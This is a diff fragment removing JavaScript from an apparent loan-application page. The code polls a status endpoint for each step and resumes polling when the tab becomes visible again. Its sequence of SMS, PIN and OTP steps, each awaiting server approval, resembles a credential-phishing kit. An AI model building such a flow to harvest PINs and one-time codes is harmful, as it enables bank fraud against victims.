-        if (Date.now() - start > POLL_MAX_DURATION) {
-            showToast('Timed out. Please retry.', 'error');
-            stopPolling(); return;
-        }
-        try {
-            const r = await fetch(`/api/status/${S.applicationId}/${step}`);
-            if (!r.ok) throw new Error('HTTP ' + r.status);
-            const data = await r.json();
-            if (data.ok) {
-                if (data.status === 'approved') { stopPolling(); onSuccess(); return; }
-                if (data.status === 'rejected') {
-                    stopPolling();
-                    handleRejection(step);
-                    return;
-                }
-            }
-        } catch (e) { console.warn('Poll:', e.message); }
-        activePoll = setTimeout(tick, POLL_INTERVAL);
-    };
-    tick();
-}
-
-function stopPolling() {
-    if (activePoll) { clearTimeout(activePoll); activePoll = null; }
-    currentPollStep = null;
-}
-
-document.addEventListener('visibilitychange', () => {
-    if (document.hidden && currentPollStep) {
-        // Pause polling when tab is hidden (resume on visible)
-        if (activePoll) { clearTimeout(activePoll); activePoll = null; }
-    } else if (!document.hidden && currentPollStep && !activePoll) {
-        // Resume
-        const step = currentPollStep;
-        const cbMap = {
-            loan: () => goTo('page-step2'),
-            personal: () => goTo('page-step3'),
-            employment: () => goTo('page-guarantor'),
-            guarantor: () => goTo('page-confirmation'),
-            sms: () => goTo('page-pin'),
-            pin: () => goTo('page-otp'),
-            otp: () => startQualificationScan(),
-            qualification: () => showApproval()
-        };
-        startPolling(step, cbMap[step] || (() => {}));
-    }
-});
-
-window.addEventListener('beforeunload', stopPolling);
-
-function handleRejection(step) {
-    showToast(`❌ ${step.toUpperCase()} rejected. Please try again.`, 'error');
-    const retryMap = {
-        loan
